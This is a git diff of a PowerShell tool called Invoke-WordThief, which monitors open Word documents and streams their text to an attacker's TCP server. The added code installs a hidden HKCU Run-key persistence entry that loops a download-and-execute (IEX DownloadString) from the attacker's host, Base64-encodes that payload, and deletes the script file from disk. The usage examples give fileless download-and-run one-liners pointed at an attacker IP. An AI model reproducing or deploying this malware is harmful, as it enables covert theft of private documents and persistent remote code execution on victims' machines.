@@ -17,50 +17,20 @@ https://github.com/danielwolfmann/Invoke-WordThief
 This script runs multithreading module that connects to a remote TCP server,
 monitors active (opened) Microsoft Word documents (.doc,.docx,etc') and extracting
 their text using Word application's COM Object.
-
-######## !!TODO: [ELABORATE ABOUT PERSISTENCY METHODOLOGY]!! ########
-
-.PARAMETER Server
-Remote server address (attacker's IP)
-
-
-.PARAMETER Log_Port
-TCP port used to connect to attacker's server (python script's listening port)
-(Default: 8888)
-
-
-.PARAMETER HTTP_Port
-HTTP port used to connect to attacker's payload server (used in persistency)
-(Default: 8000)
-
+The script adds HKCU registry (no admin needed) Run key, so this script runs persistently
 
 .EXAMPLE
-powershell -exec bypass -w 1 -nop -f Invoke-WordThief.ps1 -Server 192.168.1.100
+powershell -nop -w 1 -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/danielwolfmann/Invoke-WordThief/master/Invoke-WordThief.ps1');Invoke-WordThief -Server [attacker ip]"
+(Requires internet connection, Windows AMSI blocks it too)
 
 .EXAMPLE
-powershell -exec bypass -w 1 -nop -enc [Base64 string, look at "powershell /?" to learn how to make one]
+powershell -nop -w 1 -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://[attacker ip]/Invoke-WordThief.ps1');Invoke-WordThief -Server [attacker ip]"
+Downloads the script from attacker's HTTP file server (you can use python's "http.server" module for that)
+
+.EXAMPLE
+powershell -exec bypass -w 1 -nop -enc [Base64 string, look at "powershell.exe /?" to learn how to make one]
 
 #>
-
-param(
-[Parameter(Mandatory=$true)]
-[string]$SERVER,
-[int]$LOG_PORT = 8888,
-[int]$HTTP_PORT = 8000
-)
-
-Function Invoke-Persistency {
-    <#
-    .SYNOPSIS
-        * WIP *
-    
-    #>
-
-    # self destruction (on disk)
-    del $PSScriptRoot 2>$null
-    
-    "CONSOLESTATE /Hide`npowershell -nop -w 1 -exec bypass -c ""while(1){try{IEX (New-Object Net.WebClient).DownloadString('http://$SERVER`:$HTTP_PORT/script.ps1');exit} catch{sleep 5}}""" > "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.bat"
-}
 
 Function Wait-ForWord {
     <#
@@ -83,7 +53,16 @@ Function Wait-ForWord {
     return $word
 }
 
-Function Monitor-Word {
+Function Add-Reg {
+    param($ip, $port, $log_port)
+    $url = "http://" + $ip +':' + $port + "/script.ps1"
+    $payload = "powershell -nop -w 1 -exec bypass -c ""while(1){try{IEX (New-Object Net.WebClient).DownloadString('$url');Invoke-WordThief -Server $ip -Log_Port $log_port -HTTP_Port $port} catch{sleep 5}}"""
+    $bytes = [System.Text.Encoding]::Unicode.GetBytes($payload)
+    $enc = [Convert]::ToBase64String($bytes)
+    New-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Logger" -Value "powershell -w 1 -exec bypass -nop -enc $enc" 1>$null 2>$null
+}
+
+Function Invoke-WordThief {
     <#
     .SYNOPSIS
     
@@ -92,6 +71,19 @@ Function Monitor-Word {
 
     #>
     
+    param(
+    [Parameter(Mandatory=$true)]
+    [string]$SERVER,
+    [boolean]$PERSISTENCE = $true,
+    [int]$LOG_PORT = 8888,
+    [int]$HTTP_PORT = 8000
+    )
+
+    # executing registry persistence
+    if ($PERSISTENCE) {
+        Add-Reg $SERVER $HTTP_PORT $LOG_PORT
+    }
+
     $StreamText = {
         
         function diffstrs {param($a, $b) (Compare-Object ($a.ToCharArray()) ($b.ToCharArray()) -PassThru | where SideIndicator -eq "=>") -join "" }
@@ -165,8 +157,6 @@ Function Monitor-Word {
                 for ($i = 1 ; $i -le ($word.Documents.Count - $active_docs_count) ; $i++) {
                     # start streaming job
                     Write-Host '[*] Starting text streaming of' $word.Documents[$i].Name -ForegroundColor Yellow
-                    #"doc: $i, server: $SERVER : $LOG_PORT"
-                    #Start-Job -ScriptBlock $StreamText -ArgumentList ($word.Documents[$i], $word.UserName, $SERVER, $LOG_PORT)
                     Start-Job -ScriptBlock $StreamText -Name ("monitor_" + $word.Documents[$i].DocID) -ArgumentList ($word.Documents[$i].DocID, $word.UserName, $SERVER, $LOG_PORT) > $null
                 }
                 $active_docs_count += ($word.Documents.Count - $active_docs_count)
@@ -183,5 +173,11 @@ Function Monitor-Word {
     
 }
 
-#Invoke-Persistency
-Monitor-Word
+#if it's been executed from disk
+if ($PSCommandPath -and $args.Count -gt 1) {
+    # delete script file
+    del $PSCommandPath 2>$null
+
+    # run main function
+    Invoke-WordThief -SERVER $args[1] -LOG_PORT $args[2] -HTTP_PORT $args[3] -PERSISTENCE (!!($args[4]))
+}
